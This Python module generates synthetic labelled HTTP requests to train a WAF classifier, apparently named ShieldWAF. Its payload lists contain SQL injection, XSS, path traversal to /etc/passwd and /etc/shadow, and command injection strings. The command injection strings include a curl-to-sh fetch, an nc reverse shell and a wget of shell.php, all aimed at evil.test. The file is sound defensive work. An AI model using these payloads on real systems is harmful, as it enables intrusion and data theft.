"""
Synthetic HTTP request generator for training/evaluating ShieldWAF's
classifier.

HONEST, STATED LIMITATION: rather than bundling a real traffic capture
(which would require either a live target application or a licensed
corpus like CSIC 2010 HTTP dataset), each class is built by combining
real, documented attack payload PATTERNS drawn from OWASP's own
testing guide and Payloads-All-The-Things-style canonical examples
(e.g. `' OR '1'='1`, `<script>alert(1)</script>`, `../../etc/passwd`,
`; cat /etc/passwd`) with randomised benign-looking surrounding
request structure. This means the dataset reflects real, well-known
payload syntax -- these are the actual strings a WAF has to catch --
but the overall traffic mix and request-rate distribution is
synthetic. Swapping in a real access-log corpus (via `logs/log_parser.py`,
which shares this same feature-extraction path) is the natural next
step; see README "Future Work".
"""

from __future__ import annotations

import random
import string
from typing import List

import pandas as pd

from app.detection.features import extract_features
from app.detection.schema import FEATURE_COLUMNS

RNG_SEED = 42

BENIGN_PATHS = [
    "/", "/home", "/products", "/products/42", "/search", "/cart",
    "/checkout", "/account/profile", "/blog/2024-roundup", "/api/v1/users",
    "/api/v1/orders", "/static/logo.png", "/contact", "/about", "/login",
]
BENIGN_PARAM_KEYS = ["q", "category", "sort", "page", "id", "ref", "lang", "token"]

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "1' UNION SELECT username,password FROM users--",
    "admin'--", "1; DROP TABLE users--", "' AND SLEEP(5)--", "1' OR '1'='1' /*",
    "' UNION SELECT NULL,NULL,NULL--", "1' AND 1=1 UNION SELECT 1,version()--",
    "'; EXEC xp_cmdshell('dir')--", "' OR 1=1#", "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert('xss')>", "<a href=\"javascript:alert(1)\">click</a>",
    "'-alert(1)-'", "<img src=\"x\" onerror=\"document.location='http://evil.test'\">",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
    "../../../../../../etc/shadow", "/var/www/../../etc/passwd",
    "..%2f..%2f..%2fboot.ini", "../../../proc/self/environ",
]

CMD_INJECTION_PAYLOADS = [
    "; cat /etc/passwd", "| whoami", "&& curl http://evil.test/x.sh | sh",
    "; rm -rf /tmp/*", "$(whoami)", "`id`", "; ping -c 10 127.0.0.1",
    "| nc -e /bin/sh evil.test 4444", "; wget http://evil.test/shell.php",
]

SCANNER_UAS = [
    "sqlmap/1.6.12#stable", "Nikto/2.5.0", "Nmap Scripting Engine",
    "Mozilla/5.0 (compatible; Nessus)", "Acunetix-Product",
    "WPScan v3.8.22", "Mozilla/5.0 (compatible; masscan/1.3)",
]
SCANNER_PATHS = [
    "/wp-admin", "/wp-login.php", "/.env", "/phpmyadmin", "/admin/config.php",
    "/.git/config", "/backup.sql", "/.aws/credentials", "/actuator/env",
    "/console", "/xmlrpc.php", "/server-status",
]


def _rand_token(n=6):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _gen_benign(n: int, rng: random.Random) -> List[dict]:
    out = []
    for _ in range(n):
        path = rng.choice(BENIGN_PATHS)
        n_params = rng.randint(0, 4)
        params = "&".join(
            f"{rng.choice(BENIGN_PARAM_KEYS)}={_rand_token(rng.randint(2, 10))}"
            for _ in range(n_params)
        )
        method = rng.choice(["GET", "GET", "GET", "POST"])
        body = ""
        if method == "POST" and rng.random() < 0.5:
            body = f"name={_rand_token(8)}&email={_rand_token(6)}@example.com"
        out.append({
            "method": method, "path": path, "query_string": params, "body": body,
            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        })
    return out


def _gen_from_payloads(n: int, payloads: List[str], rng: random.Random,
                        param_key_choices=None, use_body=False) -> List[dict]:
    param_key_choices = param_key_choices or BENIGN_PARAM_KEYS
    out = []
    for _ in range(n):
        payload = rng.choice(payloads)
        key = rng.choice(param_key_choices)
        path = rng.choice(BENIGN_PATHS)
        if use_body and rng.random() < 0.5:
            body = f"{key}={payload}"
            query = ""
            method = "POST"
        else:
            query = f"{key}={payload}"
            body = ""
            method = rng.choice(["GET", "POST"])
        out.append({
            "method": method, "path": path, "query_string": query, "body": body,
            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        })
    return out


def _gen_scanner(n: int, rng: random.Random) -> List[dict]:
    out = []
    for _ in range(n):
        out.append({
            "method": "GET",
            "path": rng.choice(SCANNER_PATHS),
            "query_string": "",
            "body": "",
            "headers": {"User-Agent": rng.choice(SCANNER_UAS)},
        })
    return out


_GENERATORS = {
    "BENIGN": lambda n, rng: _gen_benign(n, rng),
    "SQLI": lambda n, rng: _gen_from_payloads(n, SQLI_PAYLOADS, rng, use_body=True),
    "XSS": lambda n, rng: _gen_from_payloads(n, XSS_PAYLOADS, rng, param_key_choices=["comment", "name", "search", "q"], use_body=True),
    "PATH_TRAVERSAL": lambda n, rng: _gen_from_payloads(n, PATH_TRAVERSAL_PAYLOADS, rng, param_key_choices=["file", "path", "page", "doc"]),
    "COMMAND_INJECTION": lambda n, rng: _gen_from_payloads(n, CMD_INJECTION_PAYLOADS, rng, param_key_choices=["host", "cmd", "ip", "target"]),
    "SCANNER_RECON": lambda n, rng: _gen_scanner(n, rng),
}


def generate_dataset(n_per_class: int = 700, seed: int = RNG_SEED) -> pd.DataFrame:
    rng = random.Random(seed)
    rows = []
    for label, gen_fn in _GENERATORS.items():
        requests = gen_fn(n_per_class, rng)
        for req in requests:
            feats = extract_features(req)
            feats["label"] = label
            rows.append(feats)
    df = pd.DataFrame(rows)[FEATURE_COLUMNS + ["label"]]
    df = df.sample(frac=1.0, random_state=seed).reset_index(drop=True)
    return df


def sample_requests(label: str, n: int = 5, seed: int | None = None) -> List[dict]:
    if label not in _GENERATORS:
        raise ValueError(f"Unknown class '{label}'. Valid: {list(_GENERATORS)}")
    rng = random.Random(seed)
    return _GENERATORS[label](n, rng)


if __name__ == "__main__":
    ds = generate_dataset(30)
    print(ds.groupby("label").size())
    print(ds.head())
